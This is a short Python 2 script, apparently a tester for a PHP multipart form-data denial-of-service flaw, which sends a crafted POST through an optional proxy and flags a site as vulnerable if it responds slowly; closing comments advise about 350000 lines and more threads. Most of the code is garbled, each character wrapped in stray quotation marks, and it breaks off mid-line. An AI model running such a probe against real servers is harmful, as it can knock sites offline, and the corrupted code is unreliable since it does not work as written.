
import sys
import urllib, urllib2
import datetime
from threading import Thread
from multiprocessing import Process
from optparse import OptionParser
import random
import string


def http_proxy(proxy_url):
    proxy_handler = urllib2.ProxyHandler({"h"t"t"p"":"" ""p""r""o""x""y""_""u""r""l""}"")""
"" "" "" "" ""n""u""l""l""_""p""r""o""x""y""_""h""a""n""d""l""e""r"" ""="" ""u""r""l""l""i""b""2"".""P""r""o""x""y""H""a""n""d""l""e""r""(""{""}"")""
"" "" "" "" ""o""p""e""n""e""r"" ""="" ""u""r""l""l""i""b""2"".""b""u""i""l""d""_""o""p""e""n""e""r""(""p""r""o""x""y""_""h""a""n""d""l""e""r"")""
"" "" "" "" ""u""r""l""l""i""b""2"".""i""n""s""t""a""l""l""_""o""p""e""n""e""r""(""o""p""e""n""e""r"")""
""
""
""d""e""f"" ""c""h""e""c""k""_""p""h""p""_""m""u""l""t""i""p""a""r""t""f""o""r""m""_""d""o""s""(""u""r""l"","" ""p""o""s""t""_""b""o""d""y"","" ""h""e""a""d""e""r""s"")"":""
"" "" "" "" ""r""e""q"" ""="" ""u""r""l""l""i""b""2"".""R""e""q""u""e""s""t""(""u""r""l"")""
"" "" "" "" ""f""o""r"" ""k""e""y"" ""i""n"" ""h""e""a""d""e""r""s"".""k""e""y""s""("")"":""
"" "" "" "" "" "" "" "" ""r""e""q"".""a""d""d""_""h""e""a""d""e""r""(""k""e""y"","" ""h""e""a""d""e""r""s""[""k""e""y""]"")""
"" "" "" "" ""s""t""a""r""t""t""i""m""e"" ""="" ""d""a""t""e""t""i""m""e"".""d""a""t""e""t""i""m""e"".""n""o""w""("")"";""
"" "" "" "" ""t""r""y"":""
"" "" "" "" "" "" "" "" ""f""d"" ""="" ""u""r""l""l""i""b""2"".""u""r""l""o""p""e""n""(""r""e""q"","" ""p""o""s""t""_""b""o""d""y"")""
"" "" "" "" ""e""x""c""e""p""t"" ""u""r""l""l""i""b""2"".""H""T""T""P""E""r""r""o""r"","" ""e"":""
"" "" "" "" "" "" "" "" ""p""r""i""n""t"" ""e""
""
"" "" "" "" ""#"" ""h""t""m""l"" ""="" ""f""d"".""r""e""a""d""("")""
"" "" "" "" ""e""n""d""t""i""m""e"" ""="" ""d""a""t""e""t""i""m""e"".""d""a""t""e""t""i""m""e"".""n""o""w""("")""
"" "" "" "" ""u""s""e""t""i""m""e"" ""="" ""(""e""n""d""t""i""m""e"" ""-"" ""s""t""a""r""t""t""i""m""e"")"".""s""e""c""o""n""d""s""
"" "" "" "" ""i""f"" ""u""s""e""t""i""m""e"" "">"" ""5"":""
"" "" "" "" "" "" "" "" ""r""e""s""u""l""t"" ""="" ""u""r""l"" ""+"" 
    * normally the lines 350000 is sufficient, otherwise 413 request entity too large
    * increasing number of threads would be great
    